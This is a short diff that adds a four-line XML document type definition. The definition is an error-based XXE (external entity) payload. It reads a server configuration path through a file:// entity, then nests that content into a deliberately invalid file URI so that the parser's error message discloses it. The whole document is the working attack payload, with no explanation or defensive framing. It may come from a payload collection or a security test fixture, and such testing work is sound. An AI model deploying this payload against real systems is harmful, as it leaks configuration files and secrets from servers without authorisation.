@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///opt/out/instance/server/default/conf/">
+<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM &#x27;file:///NOPE-HXG/%file;&#x27;>">
+%eval;
+%err;
